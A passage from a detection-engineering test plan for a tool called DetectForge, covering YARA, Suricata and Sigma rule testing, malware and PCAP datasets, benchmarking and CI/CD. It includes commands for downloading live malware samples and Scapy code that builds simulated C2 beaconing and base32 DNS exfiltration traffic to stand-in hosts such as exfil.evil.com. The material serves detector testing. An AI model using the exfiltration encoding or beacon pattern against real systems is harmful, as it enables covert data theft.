| **VirusTotal** | Largest malware corpus | `virustotal.com` -- requires API key, premium for downloads |
| **Malshare** | Free malware repository | `malshare.com` -- free API |
| **theZoo** | Live malware repository for research | `github.com/ytisf/theZoo` |
| **VirusShare** | Large malware corpus | `virusshare.com` -- requires registration |
| **Hybrid Analysis** | Sandbox analysis with sample downloads | `hybrid-analysis.com` -- free tier available |
| **ANY.RUN** | Interactive sandbox with samples | `any.run` -- limited free tier |
| **EMBER Dataset** | 1M+ PE file feature set (benign + malicious) | `github.com/elastic/ember` |
| **SOREL-20M** | 20M PE samples with labels | Sophos AI dataset |
| **Malpedia** | Curated malware families with YARA rules | `malpedia.caad.fkie.fraunhofer.de` |

**Testing Workflow:**

```bash
# 1. Download samples from MalwareBazaar by tag
curl -X POST https://mb-api.abuse.ch/api/v1/ \
    -d "query=get_taginfo&tag=Cobalt Strike&limit=10"

# 2. Download specific sample
curl -X POST https://mb-api.abuse.ch/api/v1/ \
    -d "query=get_file&sha256_hash=HASH_HERE" -o sample.zip
# Password for zip: "infected"

# 3. Test YARA rule against sample
yara -r rule.yar samples/

# 4. Test against benign files (FP check)
yara -r rule.yar /windows/system32/
yara -r rule.yar /usr/bin/
yara -r rule.yar benign_software_collection/
```

### 5.4 YARA Performance Testing

```python
import yara
import time
import os

def benchmark_yara_rule(rule_text: str, sample_dir: str, iterations: int = 3) -> dict:
    """Benchmark YARA rule scanning performance."""
    rules = yara.compile(source=rule_text)

    # Collect all files
    files = []
    for root, dirs, filenames in os.walk(sample_dir):
        for fname in filenames:
            files.append(os.path.join(root, fname))

    total_size = sum(os.path.getsize(f) for f in files)

    times = []
    for _ in range(iterations):
        start = time.time()
        for filepath in files:
            try:
                rules.match(filepath, timeout=30)
            except yara.TimeoutError:
                pass
        elapsed = time.time() - start
        times.append(elapsed)

    avg_time = sum(times) / len(times)
    throughput_mbps = (total_size / 1024 / 1024) / avg_time

    return {
        "files_scanned": len(files),
        "total_size_mb": total_size / 1024 / 1024,
        "avg_scan_time_sec": avg_time,
        "throughput_mbps": throughput_mbps,
        "verdict": "PASS" if throughput_mbps > 10 else "SLOW",
    }
```

---

## 6. Suricata Rule Testing

### 6.1 Syntax Validation

```bash
# Validate rules using Suricata's built-in engine test mode
suricata -T -c /etc/suricata/suricata.yaml -S custom_rules.rules

# -T = test mode (validate config and rules, don't run)
# -S = use only this rule file (ignore default rules)
# -c = config file

# More verbose output
suricata -T -c /etc/suricata/suricata.yaml -S custom_rules.rules -v

# Test a single rule file with minimal config
suricata -T --set "default-rule-path=/path/to/rules" -S test.rules -c /etc/suricata/suricata.yaml
```

**Common validation errors caught:**
- Invalid action (must be: `alert`, `pass`, `drop`, `reject`, `rejectsrc`, `rejectdst`, `rejectboth`)
- Invalid protocol (must be: `tcp`, `udp`, `icmp`, `ip`, `http`, `ftp`, `tls`, `smb`, `dns`, `dcerpc`, `ssh`, `smtp`, `imap`, `modbus`, `dnp3`, `enip`, `nfs`, `ikev2`, `krb5`, `ntp`, `dhcp`, `rfb`, `rdp`, `snmp`, `tftp`, `sip`, `http2`, `mqtt`, `pgsql`, `quic`)
- Invalid keyword usage
- Invalid PCRE syntax
- Conflicting options
- Invalid `sid` / `rev` values

### 6.2 Testing Against PCAP Files

```bash
# Run Suricata against a PCAP file with custom rules
suricata -r capture.pcap -S custom_rules.rules -c /etc/suricata/suricata.yaml -l /tmp/suricata_output/

# Output files generated:
# /tmp/suricata_output/eve.json     -- JSON alert log (primary)
# /tmp/suricata_output/fast.log     -- Quick alert summary
# /tmp/suricata_output/stats.log    -- Performance statistics

# Parse results
cat /tmp/suricata_output/eve.json | python3 -c "
import json, sys
alerts = []
for line in sys.stdin:
    event = json.loads(line)
    if event.get('event_type') == 'alert':
        alerts.append(event)
print(f'Total alerts: {len(alerts)}')
for alert in alerts[:10]:
    sig = alert['alert']
    print(f'  SID:{sig[\"signature_id\"]} - {sig[\"signature\"]} [{sig[\"severity\"]}]')
"
```

### 6.3 PCAP Datasets for Testing

| Dataset | Description | Source |
|---|---|---|
| **Malware Traffic Analysis** | Real-world malware PCAP files, updated regularly | `malware-traffic-analysis.net` |
| **CICIDS 2017/2018** | Labeled intrusion detection dataset with PCAPs | University of New Brunswick |
| **UNSW-NB15** | Network intrusion dataset with PCAPs | UNSW Sydney |
| **Stratosphere IPS** | Labeled malware traffic captures | `stratosphereips.org/datasets-overview` |
| **CTU-13** | Botnet traffic captures | Czech Technical University |
| **NETRESEC** | Curated PCAP repository | `netresec.com/?page=PcapFiles` |
| **PacketTotal** | PCAP analysis platform | `packettotal.com` |
| **Wireshark Sample Captures** | Various protocol sample captures | `wiki.wireshark.org/SampleCaptures` |
| **Digital Corpora** | Forensic datasets including PCAPs | `digitalcorpora.org` |
| **EVTX/PCAP from Atomic Red Team** | Captured during attack simulations | Generate yourself |

### 6.4 Synthetic PCAP Generation

```bash
# Using Scapy to generate test PCAPs
pip install scapy
```

```python
from scapy.all import *

def generate_c2_beacon_pcap(output_path: str, c2_domain: str = "evil-c2.example.com"):
    """Generate a PCAP with simulated C2 beacon traffic."""
    packets = []

    for i in range(10):
        # DNS query for C2 domain
        dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(
            rd=1, qd=DNSQR(qname=c2_domain)
        )
        packets.append(dns_query)

        # HTTP beacon (periodic check-in)
        http_request = IP(dst="203.0.113.100") / TCP(dport=443, sport=RandShort()) / Raw(
            load=f"GET /beacon?id={RandShort()}&t={i} HTTP/1.1\r\nHost: {c2_domain}\r\n\r\n"
        )
        packets.append(http_request)

    wrpcap(output_path, packets)
    print(f"Generated {len(packets)} packets to {output_path}")


def generate_port_scan_pcap(output_path: str, target: str = "192.168.1.100"):
    """Generate a PCAP with simulated port scan traffic."""
    packets = []
    for port in range(1, 1025):
        syn = IP(dst=target) / TCP(dport=port, flags="S")
        packets.append(syn)
    wrpcap(output_path, packets)
    print(f"Generated SYN scan ({len(packets)} packets) to {output_path}")


def generate_exfil_pcap(output_path: str):
    """Generate a PCAP with simulated DNS exfiltration."""
    packets = []
    import base64
    data = "SENSITIVE_DATA_STOLEN_FROM_DATABASE"
    chunks = [data[i:i+20] for i in range(0, len(data), 20)]

    for chunk in chunks:
        encoded = base64.b32encode(chunk.encode()).decode().rstrip("=").lower()
        query = f"{encoded}.exfil.evil.com"
        dns_pkt = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(
            rd=1, qd=DNSQR(qname=query, qtype="TXT")
        )
        packets.append(dns_pkt)

    wrpcap(output_path, packets)
    print(f"Generated DNS exfil ({len(packets)} packets) to {output_path}")
```

### 6.5 Suricata Rule Testing Framework

```python
import subprocess
import json
import tempfile
import os

class SuricataRuleTester:
    """Test Suricata rules against PCAP files."""

    def __init__(self, suricata_bin: str = "suricata", config: str = "/etc/suricata/suricata.yaml"):
        self.suricata_bin = suricata_bin
        self.config = config

    def validate_syntax(self, rule_text: str) -> dict:
        """Validate Suricata rule syntax."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rules', delete=False) as f:
            f.write(rule_text + "\n")
            rule_file = f.name

        try:
            result = subprocess.run(
                [self.suricata_bin, "-T", "-S", rule_file, "-c", self.config],
                capture_output=True, text=True, timeout=30
            )
            return {
                "valid": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "errors": [l for l in result.stderr.split("\n") if "Error" in l],
            }
        finally:
            os.unlink(rule_file)

    def test_against_pcap(self, rule_text: str, pcap_path: str) -> dict:
        """Test a Suricata rule against a PCAP file."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rules', delete=False) as f:
            f.write(rule_text + "\n")
            rule_file = f.name

        output_dir = tempfile.mkdtemp()

        try:
            result = subprocess.run(
                [self.suricata_bin, "-r", pcap_path, "-S", rule_file,
                 "-c", self.config, "-l", output_dir],
                capture_output=True, text=True, timeout=120
            )

            # Parse eve.json for alerts
            eve_path = os.path.join(output_dir, "eve.json")
            alerts = []
            if os.path.exists(eve_path):
                with open(eve_path) as f:
                    for line in f:
                        try:
                            event = json.loads(line)
                            if event.get("event_type") == "alert":
                                alerts.append({
                                    "signature": event["alert"]["signature"],
                                    "signature_id": event["alert"]["signature_id"],
                                    "severity": event["alert"]["severity"],
                                    "src_ip": event.get("src_ip"),
                                    "dest_ip": event.get("dest_ip"),
                                    "src_port": event.get("src_port"),
                                    "dest_port": event.get("dest_port"),
                                    "proto": event.get("proto"),
                                    "timestamp": event.get("timestamp"),
                                })
                        except json.JSONDecodeError:
                            continue

            return {
                "pcap": pcap_path,
                "alerts_count": len(alerts),
                "alerts": alerts,
                "suricata_exit_code": result.returncode,
            }
        finally:
            os.unlink(rule_file)
            # Clean up output_dir
            import shutil
            shutil.rmtree(output_dir, ignore_errors=True)
```

### 6.6 Dalton (Suricata/Snort Rule Testing Platform)

**Repository:** `https://github.com/secureworks/dalton`

Dalton is a web-based system for testing Suricata/Snort rules against PCAP files. It provides:
- Upload PCAP + rules via web UI or API
- Run against multiple Suricata versions
- View alerts, performance stats
- API for CI/CD integration

```bash
# Install Dalton
git clone https://github.com/secureworks/dalton.git
cd dalton
docker-compose up -d

# API usage
curl -X POST http://localhost:8080/dalton/coverage/engine/suricata/6.0.0 \
    -F "rules-file=@custom.rules" \
    -F "pcap-file=@capture.pcap" \
    -F "sensor-config=@suricata.yaml"
```

---

## 7. Benchmarking Against Existing Rules

### 7.1 Reference Rule Corpora

| Corpus | Size | Description |
|---|---|---|
| **SigmaHQ** | 3,000+ rules | Community-maintained Sigma rules, gold standard |
| **Elastic Detection Rules** | 1,000+ rules | Elastic Security detection rules (KQL + EQL) |
| **Splunk Security Content** | 1,200+ rules | Splunk's detection analytics library |
| **YARA-Rules Project** | 500+ rules | Community YARA rules |
| **Awesome YARA** | Curated list | Links to high-quality YARA rule repos |
| **ET Open (Emerging Threats)** | 40,000+ rules | Open Suricata/Snort rules |
| **ET Pro** | 60,000+ rules | Commercial Suricata/Snort rules |

### 7.2 Quality Metrics for Rule Comparison

```python
from dataclasses import dataclass
from typing import Optional
import re

@dataclass
class RuleQualityScore:
    """Comprehensive quality score for a detection rule."""

    # Structural Quality (0-25 points)
    has_title: bool                  # 2 pts
    has_description: bool            # 3 pts
    description_length: int          # 0-2 pts (>50 chars = 2)
    has_references: bool             # 2 pts
    has_author: bool                 # 1 pt
    has_date: bool                   # 1 pt
    has_modified: bool               # 1 pt
    has_status: bool                 # 1 pt
    has_level: bool                  # 2 pts
    has_falsepositives: bool         # 3 pts
    has_tags: bool                   # 2 pts
    has_id: bool                     # 2 pts
    syntax_valid: bool               # 3 pts  (required -- 0 if false invalidates all)

    # Detection Logic Quality (0-25 points)
    detection_field_count: int       # 0-5 pts (more fields = more specific)
    uses_multiple_conditions: bool   # 3 pts (filter + selection)
    has_negation_filter: bool        # 2 pts (excludes known FPs)
    condition_complexity: int        # 0-5 pts (balanced complexity)
    uses_field_modifiers: bool       # 2 pts (|contains, |endswith, etc.)
    targets_specific_event_id: bool  # 3 pts
    logsource_specificity: int       # 0-5 pts

    # Coverage & Context (0-25 points)
    attack_technique_count: int      # 0-5 pts
    attack_tags_valid: bool          # 5 pts
    covers_subtechnique: bool        # 3 pts
    has_data_source_context: bool    # 2 pts
    detection_depth_score: float     # 0-10 pts (specificity vs. coverage)

    # Effectiveness (0-25 points, measured through testing)
    true_positive_rate: float        # 0-10 pts
    false_positive_rate: float       # 0-10 pts (lower = better)
    performance_score: float         # 0-5 pts (scan speed)

    @property
    def structural_score(self) -> float:
        score = 0
        score += 2 if self.has_title else 0
        score += 3 if self.has_description else 0
        score += min(2, self.description_length // 50)
        score += 2 if self.has_references else 0
        score += 1 if self.has_author else 0
        score += 1 if self.has_date else 0
        score += 1 if self.has_modified else 0
        score += 1 if self.has_status else 0
        score += 2 if self.has_level else 0
        score += 3 if self.has_falsepositives else 0
        score += 2 if self.has_tags else 0
        score += 2 if self.has_id else 0
        score += 3 if self.syntax_valid else -25  # Syntax failure = 0 overall
        return min(25, max(0, score))

    @property
    def total_score(self) -> float:
        return self.structural_score  # + other categories when measured


class RuleBenchmarker:
    """Compare DetectForge rules against reference rule corpora."""

    def __init__(self, reference_rules_dir: str):
        self.reference_rules = self._load_reference_rules(reference_rules_dir)

    def _load_reference_rules(self, rules_dir: str) -> list:
        import yaml
        from pathlib import Path
        rules = []
        for f in Path(rules_dir).rglob("*.yml"):
            try:
                with open(f) as fh:
                    rule = yaml.safe_load(fh)
                    if rule and "detection" in rule:
                        rule["_source_file"] = str(f)
                        rules.append(rule)
            except Exception:
                continue
        return rules

    def compare_rule(self, generated_rule: dict, technique_id: str) -> dict:
        """Compare a generated rule against reference rules for the same technique."""

        # Find reference rules for the same technique
        ref_rules = [
            r for r in self.reference_rules
            if any(technique_id.lower() in str(t).lower() for t in r.get("tags", []))
        ]

        if not ref_rules:
            return {
                "technique": technique_id,
                "reference_rules_found": 0,
                "comparison": "NO_REFERENCE",
                "message": f"No reference rules found for {technique_id}",
            }

        # Compare detection logic complexity
        gen_fields = self._count_detection_fields(generated_rule)
        ref_fields_avg = sum(self._count_detection_fields(r) for r in ref_rules) / len(ref_rules)

        # Compare metadata completeness
        gen_metadata_score = self._metadata_score(generated_rule)
        ref_metadata_avg = sum(self._metadata_score(r) for r in ref_rules) / len(ref_rules)

        # Compare detection keyword usage
        gen_keywords = self._extract_detection_values(generated_rule)
        ref_keywords = set()
        for r in ref_rules:
            ref_keywords.update(self._extract_detection_values(r))

        keyword_overlap = len(gen_keywords & ref_keywords) / max(len(gen_keywords | ref_keywords), 1)

        return {
            "technique": technique_id,
            "reference_rules_found": len(ref_rules),
            "generated_detection_fields": gen_fields,
            "reference_avg_detection_fields": ref_fields_avg,
            "generated_metadata_score": gen_metadata_score,
            "reference_avg_metadata_score": ref_metadata_avg,
            "keyword_overlap_ratio": keyword_overlap,
            "novel_keywords": list(gen_keywords - ref_keywords),
            "missing_keywords": list(ref_keywords - gen_keywords)[:10],
        }

    def _count_detection_fields(self, rule: dict) -> int:
        detection = rule.get("detection", {})
        count = 0
        for key, value in detection.items():
            if key == "condition":
                continue
            if isinstance(value, dict):
                count += len(value)
            elif isinstance(value, list):
                count += len(value)
        return count

    def _metadata_score(self, rule: dict) -> float:
        fields = ["title", "description", "references", "author", "date",
                  "modified", "status", "level", "falsepositives", "tags", "id"]
        present = sum(1 for f in fields if rule.get(f))
        return present / len(fields) * 100

    def _extract_detection_values(self, rule: dict) -> set:
        """Extract all string values from detection section."""
        values = set()
        detection = rule.get("detection", {})
        for key, value in detection.items():
            if key == "condition":
                continue
            self._extract_values_recursive(value, values)
        return values

    def _extract_values_recursive(self, obj, values: set):
        if isinstance(obj, str):
            values.add(obj.lower())
        elif isinstance(obj, list):
            for item in obj:
                self._extract_values_recursive(item, values)
        elif isinstance(obj, dict):
            for v in obj.values():
                self._extract_values_recursive(v, values)
```

### 7.3 Automated A/B Testing Framework

```python
class DetectionABTest:
    """A/B test DetectForge rules vs. reference rules on the same dataset."""

    def run_ab_test(self, technique_id: str, attack_logs: list, benign_logs: list,
                    generated_rule_yaml: str, reference_rule_yamls: list) -> dict:
        """Run an A/B test comparing detection effectiveness."""

        gen_tp = self._count_matches(generated_rule_yaml, attack_logs)
        gen_fp = self._count_matches(generated_rule_yaml, benign_logs)

        ref_results = []
        for ref_yaml in reference_rule_yamls:
            ref_tp = self._count_matches(ref_yaml, attack_logs)
            ref_fp = self._count_matches(ref_yaml, benign_logs)
            ref_results.append({"tp": ref_tp, "fp": ref_fp})

        avg_ref_tp = sum(r["tp"] for r in ref_results) / max(len(ref_results), 1)
        avg_ref_fp = sum(r["fp"] for r in ref_results) / max(len(ref_results), 1)

        gen_tpr = gen_tp / max(len(attack_logs), 1)
        gen_fpr = gen_fp / max(len(benign_logs), 1)
        ref_tpr = avg_ref_tp / max(len(attack_logs), 1)
        ref_fpr = avg_ref_fp / max(len(benign_logs), 1)

        # F1-like score: balance TP rate and (1 - FP rate)
        gen_score = 2 * (gen_tpr * (1 - gen_fpr)) / max(gen_tpr + (1 - gen_fpr), 0.001)
        ref_score = 2 * (ref_tpr * (1 - ref_fpr)) / max(ref_tpr + (1 - ref_fpr), 0.001)

        return {
            "technique": technique_id,
            "generated": {
                "true_positives": gen_tp,
                "false_positives": gen_fp,
                "tpr": gen_tpr,
                "fpr": gen_fpr,
                "score": gen_score,
            },
            "reference_avg": {
                "true_positives": avg_ref_tp,
                "false_positives": avg_ref_fp,
                "tpr": ref_tpr,
                "fpr": ref_fpr,
                "score": ref_score,
            },
            "winner": "generated" if gen_score >= ref_score else "reference",
            "score_delta": gen_score - ref_score,
        }

    def _count_matches(self, rule_yaml: str, logs: list) -> int:
        """Count how many log events match a Sigma rule."""
        # Use backend conversion + matching
        # (Implementation depends on chosen backend)
        pass
```

---

## 8. CI/CD for Detection Rules

### 8.1 Detection-as-Code Pipeline Architecture

```
+------------------+    +------------------+    +------------------+
|   DetectForge    |    |   CI/CD Pipeline |    |   Production     |
|   generates      |--->|   validates &    |--->|   SIEM/EDR       |
|   rule           |    |   tests          |    |   deployment     |
+------------------+    +------------------+    +------------------+
                              |
                    +---------+---------+
                    |                   |
              +-----v------+    +------v-----+
              | Unit Tests |    | Integration|
              | (syntax,   |    | Tests      |
              | schema,    |    | (TP/FP,    |
              | validators)|    | coverage)  |
              +------------+    +------------+
```

### 8.2 GitHub Actions CI/CD Pipeline

```yaml
# .github/workflows/detection-rules-ci.yml
name: Detection Rules CI/CD

on:
  push:
    paths:
      - 'rules/**'
  pull_request:
    paths:
      - 'rules/**'

jobs:
  # ===== STAGE 1: Syntax & Schema Validation =====
  validate-sigma:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install sigma-cli pySigma pySigma-backend-sqlite pySigma-pipeline-sysmon
          pip install pySigma-pipeline-windows

      - name: Validate all Sigma rules
        run: |
          echo "=== Syntax Validation ==="
          sigma check rules/sigma/ 2>&1 | tee sigma_validation.log
          if grep -q "ERROR" sigma_validation.log; then
            echo "VALIDATION FAILED"
            exit 1
          fi

      - name: Custom quality checks
        run: |
          python scripts/quality_check.py rules/sigma/

  validate-yara:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install YARA
        run: |
          sudo apt-get update && sudo apt-get install -y yara

      - name: Validate all YARA rules
        run: |
          for rule in rules/yara/*.yar; do
            echo "Validating: $rule"
            yara -C "$rule" || exit 1
          done

      - name: Python YARA validation
        run: |
          pip install yara-python
          python scripts/validate_yara.py rules/yara/

  validate-suricata:
    runs-on: ubuntu-latest
    container:
      image: jasonish/suricata:latest
    steps:
      - uses: actions/checkout@v4

      - name: Validate Suricata rules
        run: |
          suricata -T -S rules/suricata/custom.rules -c /etc/suricata/suricata.yaml

  # ===== STAGE 2: Unit Tests (True Positive / False Positive) =====
  test-sigma-tp:
    needs: validate-sigma
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          pip install pySigma chainsaw-python
          # Download Chainsaw binary
          wget https://github.com/WithSecureLabs/chainsaw/releases/latest/download/chainsaw-x86_64-unknown-linux-gnu.tar.gz
          tar xzf chainsaw-*.tar.gz

      - name: Download test datasets
        run: |
          # Download EVTX attack samples
          git clone --depth 1 https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES.git test_data/attack_evtx/

      - name: Run true positive tests
        run: |
          ./chainsaw hunt test_data/attack_evtx/ \
            --sigma rules/sigma/ \
            --mapping mappings/sigma-event-logs-all.yml \
            --json --output tp_results.json

          python scripts/evaluate_tp.py tp_results.json

      - name: Run false positive tests
        run: |
          # Use benign baseline EVTX
          ./chainsaw hunt test_data/benign_evtx/ \
            --sigma rules/sigma/ \
            --mapping mappings/sigma-event-logs-all.yml \
            --json --output fp_results.json

          python scripts/evaluate_fp.py fp_results.json --max-fp-rate 0.01

  test-suricata-pcap:
    needs: validate-suricata
    runs-on: ubuntu-latest
    container:
      image: jasonish/suricata:latest
    steps:
      - uses: actions/checkout@v4

      - name: Test against malicious PCAPs
        run: |
          mkdir -p /tmp/suricata_output
          for pcap in test_data/pcaps/malicious/*.pcap; do
            suricata -r "$pcap" -S rules/suricata/custom.rules \
              -c /etc/suricata/suricata.yaml -l /tmp/suricata_output/
          done

      - name: Verify alerts generated
        run: |
          python scripts/evaluate_suricata.py /tmp/suricata_output/eve.json

  # ===== STAGE 3: Coverage Analysis =====
  coverage-analysis:
    needs: [test-sigma-tp, test-suricata-pcap]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Generate ATT&CK coverage report
        run: |
          pip install mitreattack-python pyyaml
          python scripts/coverage_report.py rules/ --output coverage_report.json

      - name: Generate Navigator layer
        run: |
          python scripts/generate_navigator_layer.py rules/ --output navigator_layer.json

      - name: Check minimum coverage thresholds
        run: |
          python scripts/check_coverage.py coverage_report.json \
            --min-technique-coverage 60 \
            --min-tactic-coverage 80

      - name: Upload coverage artifacts
        uses: actions/upload-artifact@v4
        with:
          name: coverage-reports
          path: |
            coverage_report.json
            navigator_layer.json

  # ===== STAGE 4: Deployment (on merge to main) =====
  deploy-rules:
    needs: coverage-analysis
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Package rules
        run: |
          tar czf detectforge-rules-$(date +%Y%m%d).tar.gz rules/

      - name: Deploy to SIEM
        run: |
          # Example: Deploy Sigma rules converted to Splunk
          pip install pySigma pySigma-backend-splunk pySigma-pipeline-splunk-windows
          python scripts/deploy_to_splunk.py rules/sigma/ --splunk-url ${{ secrets.SPLUNK_URL }}

          # Example: Deploy Suricata rules
          scp rules/suricata/custom.rules suricata-sensor:/etc/suricata/rules/
          ssh suricata-sensor "suricatasc -c reload-rules"
```

### 8.3 Pre-Commit Hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: sigma-validate
        name: Validate Sigma Rules
        entry: sigma check
        language: python
        files: '\.yml$'
        types: [yaml]
        additional_dependencies: ['sigma-cli']

      - id: yara-validate
        name: Validate YARA Rules
        entry: python scripts/validate_yara.py
        language: python
        files: '\.yar$'
        additional_dependencies: ['yara-python']

      - id: rule-quality-gate
        name: Rule Quality Gate
        entry: python scripts/quality_gate.py
        language: python
        files: '\.(yml|yar|rules)$'
        additional_dependencies: ['pySigma', 'yara-python', 'pyyaml']
```

### 8.4 Quality Gate Script

```python
#!/usr/bin/env python3
# scripts/quality_gate.py
"""
Quality gate for detection rules.
Runs as a pre-commit hook or CI step.
Exit code 0 = pass, 1 = fail.
"""

import sys
import yaml
from pathlib import Path

REQUIRED_SIGMA_FIELDS = ["title", "id", "status", "description", "logsource",
                         "detection", "level", "tags"]
MIN_DESCRIPTION_LENGTH = 20
REQUIRED_TAG_PREFIX = "attack."


def check_sigma_rule(filepath: str) -> list:
    """Check a Sigma rule file and return issues."""
    issues = []
    with open(filepath) as f:
        try:
            rule = yaml.safe_load(f)
        except yaml.YAMLError as e:
            return [f"YAML parse error: {e}"]

    if not rule:
        return ["Empty rule file"]

    # Required fields
    for field in REQUIRED_SIGMA_FIELDS:
        if field not in rule:
            issues.append(f"Missing required field: {field}")

    # Description quality
    desc = rule.get("description", "")
    if len(desc) < MIN_DESCRIPTION_LENGTH:
        issues.append(f"Description too short ({len(desc)} chars, min {MIN_DESCRIPTION_LENGTH})")

    # Must have ATT&CK tags
    tags = rule.get("tags", [])
    attack_tags = [t for t in tags if str(t).startswith(REQUIRED_TAG_PREFIX + "t")]
    if not attack_tags:
        issues.append("No MITRE ATT&CK technique tags found")

    # Detection section must have condition
    detection = rule.get("detection", {})
    if "condition" not in detection:
        issues.append("Detection section missing 'condition'")

    # Should have falsepositives
    if "falsepositives" not in rule:
        issues.append("Missing 'falsepositives' section (warning)")

    # ID should be a valid UUID
    rule_id = rule.get("id", "")
    import re
    uuid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
    if rule_id and not re.match(uuid_pattern, str(rule_id)):
        issues.append(f"Rule ID is not a valid UUID: {rule_id}")

    return issues


def main():
    files = sys.argv[1:]
    if not files:
        print("No files to check")
        sys.exit(0)

    total_issues = 0
    for filepath in files:
        path = Path(filepath)
        if path.suffix == ".yml" and "sigma" in str(path).lower():
            issues = check_sigma_rule(filepath)
            if issues:
                print(f"\n{filepath}:")
                for issue in issues:
                    print(f"  - {issue}")
                total_issues += len(issues)

    if total_issues > 0:
        print(f"\nQuality gate FAILED: {total_issues} issues found")
        sys.exit(1)
    else:
        print("Quality gate PASSED")
        sys.exit(0)


if __name__ == "__main__":
    main()
```

### 8.5 Production Detection Engineering Workflows (Industry Practices)

**How leading detection engineering teams operate:**

1. **Panther Labs** -- Detection-as-Code platform
   - Rules written in Python
   - Unit tests with `panther_analysis_tool test`
   - CI/CD with GitHub Actions
   - Automatic deployment on merge

2. **Elastic Security** -- Detection Rules repo
   - `github.com/elastic/detection-rules`
   - Python-based test framework
   - Each rule has unit tests with sample events
   - `python -m detection_rules test` runs all tests
   - Automated MITRE ATT&CK coverage tracking

3. **Splunk Security Content** -- `github.com/splunk/security_content`
   - `contentctl` tool for validation and testing
   - Attack data stored alongside rules
   - Automated testing against Splunk instances
   - Coverage reports auto-generated

4. **Anvilogic** -- Detection-as-Code platform
   - Rules tested against replay data
   - Automated FP scoring
   - Continuous tuning based on alert feedback

---

## 9. Recommended Test Architecture for DetectForge

### 9.1 Test Pyramid

```
                    /\
                   /  \
                  / E2E \        End-to-end: Full pipeline tests
                 / Tests \       (generate rule -> test -> deploy)
                /----------\
               / Integration \   Integration: Rules tested against
              /    Tests      \  real attack/benign log datasets
             /----------------\  using Chainsaw/Hayabusa/Suricata
            /    Unit Tests    \ Unit: Syntax, schema, validators,
           /                    \ quality checks for each rule
          /______________________\
```

### 9.2 Test Data Organization

```
detectforge/
 rules/
    sigma/
    yara/
    suricata/
 tests/
    unit/
       test_sigma_validation.py
       test_yara_validation.py
       test_suricata_validation.py
    integration/
       test_sigma_tp.py          # True positive tests
       test_sigma_fp.py          # False positive tests
       test_yara_samples.py
       test_suricata_pcap.py
    e2e/
        test_full_pipeline.py
        test_coverage.py
 test_data/
    attack_logs/                   # From Security Datasets / Atomic Red Team
       T1059.001/
       T1003.001/
       ...
    benign_logs/                   # Normal activity baselines
       windows_workstation/
       linux_server/
    malware_samples/               # For YARA testing (hashes only in repo)
       download_samples.py
    pcaps/
       malicious/
       benign/
    evtx/
        attack/
        benign/
 scripts/
    quality_gate.py
    coverage_report.py
    generate_navigator_layer.py
    evaluate_tp.py
    evaluate_fp.py
    benchmark.py
 mappings/
    sigma-event-logs-all.yml       # Chainsaw mappings
 .github/
     workflows/
         detection-rules-ci.yml
```

### 9.3 Comprehensive Test Runner

```python
#!/usr/bin/env python3
# scripts/run_all_tests.py
"""Master test runner for DetectForge detection rules."""

import json
import sys
from datetime import datetime
from pathlib import Path

class DetectForgeTestRunner:
    """Orchestrates all testing stages."""

    def __init__(self, rules_dir: str, test_data_dir: str):
        self.rules_dir = Path(rules_dir)
        self.test_data_dir = Path(test_data_dir)
        self.results = {
            "timestamp": datetime.utcnow().isoformat(),
            "stages": {},
            "summary": {},
        }

    def run_all(self) -> dict:
        """Run all test stages."""
        print("=" * 60)
        print("DetectForge Detection Rule Test Suite")
        print("=" * 60)

        # Stage 1: Syntax & Schema Validation
        print("\n[Stage 1/5] Syntax & Schema Validation")
        self.results["stages"]["validation"] = self._run_validation()

        # Stage 2: True Positive Testing
        print("\n[Stage 2/5] True Positive Testing")
        self.results["stages"]["true_positives"] = self._run_tp_tests()

        # Stage 3: False Positive Testing
        print("\n[Stage 3/5] False Positive Testing")
        self.results["stages"]["false_positives"] = self._run_fp_tests()

        # Stage 4: Coverage Analysis
        print("\n[Stage 4/5] Coverage Analysis")
        self.results["stages"]["coverage"] = self._run_coverage_analysis()

        # Stage 5: Benchmarking
        print("\n[Stage 5/5] Benchmarking vs. Reference Rules")
        self.results["stages"]["benchmarking"] = self._run_benchmarks()

        # Summary
        self._compute_summary()
        return self.results

    def _run_validation(self) -> dict:
        """Stage 1: Validate all rules."""
        results = {"sigma": [], "yara": [], "suricata": []}

        # Sigma validation
        for rule_file in self.rules_dir.glob("sigma/**/*.yml"):
            # Run sigma check equivalent
            pass

        # YARA validation
        for rule_file in self.rules_dir.glob("yara/**/*.yar"):
            # Run yara -C equivalent
            pass

        # Suricata validation
        for rule_file in self.rules_dir.glob("suricata/**/*.rules"):
            # Run suricata -T equivalent
            pass

        return results

    def _run_tp_tests(self) -> dict:
        """Stage 2: Test rules against known attack data."""
        # Use Chainsaw/Hayabusa for Sigma + EVTX
        # Use yara for YARA + samples
        # Use suricata -r for Suricata + PCAP
        return {}

    def _run_fp_tests(self) -> dict:
        """Stage 3: Test rules against benign data."""
        return {}

    def _run_coverage_analysis(self) -> dict:
        """Stage 4: MITRE ATT&CK coverage analysis."""
        return {}

    def _run_benchmarks(self) -> dict:
        """Stage 5: Compare against reference rules."""
        return {}

    def _compute_summary(self):
        """Compute overall test summary."""
        self.results["summary"] = {
            "overall_status": "PASS",  # or FAIL
            "rules_tested": 0,
            "rules_passed": 0,
            "rules_failed": 0,
            "coverage_percentage": 0,
            "avg_quality_score": 0,
        }
```

---

## 10. Implementation Roadmap

### Phase 1: Foundation (Week 1-2)
- [ ] Set up `pySigma` validation in CI
- [ ] Set up `yara-python` validation in CI
- [ ] Set up Suricata Docker container for rule validation
- [ ] Create quality gate pre-commit hooks
- [ ] Define minimum quality thresholds for generated rules

